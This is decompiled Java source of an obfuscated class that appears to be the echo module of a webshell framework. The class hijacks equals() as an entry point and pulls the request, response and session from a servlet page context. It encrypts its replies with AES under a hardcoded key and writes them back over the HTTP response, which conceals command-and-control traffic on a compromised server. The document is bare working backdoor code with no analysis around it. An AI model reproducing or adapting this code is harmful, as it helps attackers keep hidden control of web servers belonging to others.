package net.qmrqiui;

import java.lang.reflect.Method;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/* JADX INFO: compiled from: Echo.java */
/* JADX INFO: loaded from: 001_frame_404223.class */
public class Fmdrfajtrr {
    public static String content;
    public static String payloadBody;
    private Object Request;
    private Object Response;
    private Object Session;

    private byte[] Encrypt(byte[] bArr) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec("1f2c8075acd3d118".getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, secretKeySpec);
        byte[] bArrDoFinal = cipher.doFinal(bArr);
        try {
            Class<?> cls = Class.forName("java.util.Base64");
            Object objInvoke = cls.getMethod("getEncoder", null).invoke(cls, null);
            bArrDoFinal = (byte[]) objInvoke.getClass().getMethod("encode", byte[].class).invoke(objInvoke, bArrDoFinal);
        } catch (Throwable th) {
            Object objNewInstance = Class.forName("sun.misc.BASE64Encoder").newInstance();
            bArrDoFinal = ((String) objNewInstance.getClass().getMethod("encode", byte[].class).invoke(objNewInstance, bArrDoFinal)).replace("\n", "").replace("\r", "").getBytes();
        }
        return bArrDoFinal;
    }

    public Fmdrfajtrr() {
        content = "";
        content += "1oMRO2dvZFDzLDMX8hNiYBh2qzBvSzSi1EaD2vCMM7Q8kxqxrX085JlqFrt40qku6RCR0D0JF3tPc5fYUWW5Op0YP9hLpG8MPlgtOpMYbdDH1iGmuWO75I3XVO9evcyqhb19Sk3Et99wkKl5fsYAWZKEofJmsis7Vv2uCRwGbsE6LvpmqNGvJnB3v";
    }

    public boolean equals(Object obj) {
        Map<String, String> result = new LinkedHashMap<>();
        try {
            try {
                fillContext(obj);
                result.put("status", "success");
                result.put("msg", content);
                try {
                    Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write = so.getClass().getMethod("write", byte[].class);
                    write.invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                    so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
                    return true;
                } catch (Exception e) {
                    e.printStackTrace();
                    return true;
                }
            } catch (Throwable th) {
                try {
                    Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                    Method write2 = so2.getClass().getMethod("write", byte[].class);
                    write2.invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                    so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                    so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
                } catch (Exception e2) {
                    e2.printStackTrace();
                }
                throw th;
            }
        } catch (Exception e3) {
            result.put("msg", e3.getMessage());
            result.put("status", "success");
            try {
                Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                Method write3 = so3.getClass().getMethod("write", byte[].class);
                write3.invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
                return true;
            } catch (Exception e4) {
                e4.printStackTrace();
                return true;
            }
        }
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                value = base64encode(value.getBytes());
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private String base64encode(byte[] data) throws Exception {
        String result;
        System.getProperty("java.version");
        try {
            getClass();
            Class<?> cls = Class.forName("java.util.Base64");
            Object Encoder = cls.getMethod("getEncoder", null).invoke(cls, null);
            result = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, data);
        } catch (Throwable th) {
            getClass();
            Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
            String result2 = (String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, data);
            result = result2.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; i++) {
            buf[i] = (byte) random.nextInt(256);
        }
        return buf;
    }
}
